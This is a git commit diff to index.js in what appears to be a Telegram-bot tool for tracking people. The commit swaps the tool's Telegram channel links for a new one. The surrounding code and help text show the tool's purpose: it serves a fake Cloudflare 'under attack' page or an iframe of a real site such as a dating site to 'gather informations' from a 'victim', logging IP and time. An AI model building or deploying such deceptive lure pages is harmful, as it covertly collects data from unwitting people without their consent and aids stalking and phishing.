bb647f1200fbe7de4ebddeaa71581a4a34870ff3
AyushBotz <129131041+AyushBotz@users.noreply.github.com>
2023-05-17 11:08:08 +0530

    Update index.js

--- index.js
+++ index.js
@@ -17,7 +17,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/onlinehacking");
+res.redirect("https://t.me/PiroHackz");
 }
 
          
@@ -35,7 +35,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/onlinehacking");
+res.redirect("https://t.me/PiroHackz");
 }                          
 });
 
@@ -72,7 +72,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nJoin Telegram Channel: https://t.me/OnlineHacKing
+\n\nJoin Telegram Channel: https://t.me/PiroHackz
 `);
 }
   
